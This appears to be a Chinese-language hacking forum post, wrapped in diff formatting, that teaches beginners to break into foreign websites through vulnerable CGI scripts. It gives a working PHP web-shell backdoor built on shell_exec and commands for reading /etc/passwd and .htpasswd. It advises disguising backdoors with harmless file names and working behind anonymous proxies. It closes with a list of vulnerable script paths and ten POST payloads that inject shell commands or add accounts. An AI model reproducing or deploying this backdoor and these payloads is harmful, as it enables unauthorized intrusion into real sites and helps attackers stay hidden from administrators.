@@ -1,0 +1,131 @@
+CGI 脚本入侵快速上手+脚本使用方法
+大家好 我是bboyhip  只是一名菜菜的exploiter
+很开心来到贵论坛
+这里让我感觉 很有技术交流的感觉
+我会长长来玩的
+前言:
+以下讲解针对欧美日本网站
+當我們在做滲透分析的時候 方法有很多
+我门都知道 国外伺服器大多是linux 平台
+所以有很多网站程序有6成都会使用cgi 脚本来管理
+目录为/cgi-bin/
+
+只是个人在实务上一些经验
+写的不好 请多多见谅喔 
+在这里我简单分为几个部份一定要會的
+讲解一下
+让没有基础的人很容易上手
+
+以下内容跟帖回复才能看到
+==============================
+
+第1部份: 何谓Shell?
+Shell的中文, 可称为 "壳".  Shell 是一个比较复杂的概念, 先看比较传统的解释:
+A shell is the program which reads user input from the command line and executes actions based upon that input.
+意思是, 通过应用程式(shell), 用户输入指令, 由系统执行该指令.
+
+对於黑客来说, shell是後门, 是入侵/ 控制/ 浏览对方系统的程式/ 方法.  
+要自行建立一个shell是十分困难的, 因为要先找漏洞, 找到後, 利用该漏洞来写入档案/ 後门.  大家都知道, 有些漏洞只可加码, 有些可读档, 但可以写档的不多.  在数年前, 有一个十分流行及易用的漏洞addpasswd.cgi, 可以写後门, 但时至今日, 绝大部份的addpasswd.cgi已经被删除.
+所以, 对於入门的exploiter来说, 先收集别人的後门, 多多练习, 然後再学习做自己的shell.
+
+第2部份: Unix 指令
+以下是一些常见及重要的指令:
+pwd: 显示当前目录, 即是後门/程式所在的位置
+如 /home/www/site.com/cgi-bin/
+ls: 列出档案 (-a 包含隐藏档; -l 包含详细资料).  
+ls -al :详细列出档案资料(当前目录)
+ls /: 列出根目录
+ls /etc: 列出/etc的资料夹及档案
+ls ../ -al: 详细列出上一层的资料夹及档案
+cat: 显示档案内容
+cat .htpasswd: 显示 .htpasswd 这个档案的内容(当前目录)
+cat /etc/passwd: 显示 /etc/passwd 这个档案的内容
+who: 显示谁login 至系统
+man: 显示指令用法  
+man ls: 显示ls这指令的用法  
+mkdir 建立目录
+rmdir 删除目录
+mv 移动档案
+rm 删除档案
+
+第3部份: Shell的使用
+例如:
+http://site.com/refer.php
+这是我的後门, 原代码如下:
+<Form Action="#" Method="POST"> 
+<Input type="text" name="cmd"> 
+<Input type="Submit"> 
+</Form> 
+<?php 
+$cmd = $_POST['cmd']; 
+$Output = shell_exec($cmd); 
+echo $Output; 
+?> 
+输入pwd, 可得到绝对路径:
+/home/htdocs/users/jnesbitt/jnesbitt/nylonfantasies.com
+
+第4部份: 注意事项
+- 使用匿名代理, 保障自己
+- 不可恶意破坏, 或更改现有档案, 否则管理员发现了, 不但会删除後门, 可能会有追究行动
+- 加後门前, 必须了解目标系统是否支援.  例如, cgi後门, 应放在cgi-bin; 有些系统可能不支援 php後门等.
+- 加後门前 (如 index.php), 先检查是否已存在该档案名称, 以免覆盖原有档案, 造成破坏.
+- 後门的名称, 不可使用hack, crack, exploit等字眼, 最好使用index, index1, log, login, refer, tmp, test, info等, 鱼目混珠,
+不容易被发现.
+- 将後门放在比较隐闭的地方 (例如 /cgi-bin/内, 有很多cgi档案, 比较少php档案)
+针对网站的渗透分析方法太多了
+这篇文章的重点是cgi 脚本攻击
+所以我用简单的叙述形容
+开始讲解脚本入侵过程:
+在这里提供一些方法思路让大家学习一下
+
+1.一开始对一个网站进行cgi漏洞扫描
+我们需要的东西有
+扫洞工具 如:triton..等等
+E表
+如
+/cgi-bin/add-passwd.cgi 
+/WebShop/templates/cc.txt
+/Admin_files/order.log
+/orders/mountain.cfg
+/cgi-sys/cart.pl
+/scripts/cart.pl
+/htbin/cart.pl
+E表来源可以是网路收寻或是自己的0 day
+
+2.怎样确认扫到的洞 是真的还假的?
+举例: target: http://www.site.com/cgi-bin/add-passwd.cgi
+一般都是在IE里先看一下的,记住这个返回码哦
+ERROR:This script should be referenced with a METHOD of POST.
+没有返回一定是假的
+3.重来来了 很多人都会问我
+他扫到很多洞 但是不会使用 
+因为这些漏洞 使用的语法 称为post 
+我们要找post 的方法很多
+可以是源代码分析 找出介质
+或是用抓包工具 抓他的语法...等等
+
+以下我提供10个 cgi 洞以及使用方法post
+让大家可以针对网站去做扫描  
+/index.cgi
+wei=ren&gen=command
+/passmaster.cgi
+Action=Add&Username=Username&Password=Password
+/accountcreate.cgi
+username=username&password=password&ref1=|echo;ls|
+/form.cgi
+name=xxxx&email=email&subject=xxxx&response=|echo;ls|
+/addusr.pl
+/cgi-bin/EuroDebit/addusr.pl
+user=username&pass=Password&confirm=Password
+/ccbill-local.asp
+post_values=username:password
+/count.cgi
+pinfile=|echo;ls -la;exit| 
+/recon.cgi
+/recon.cgi?search
+searchoption=1&searchfor=|echo;ls -al;exit|
+/verotelrum.pl
+vercode=username:password:dseegsow:add:amount<&30>
+/af.cgi_browser_out=|echo;ls -la;exit;|
+
+今天就讲到这  感谢大家支持
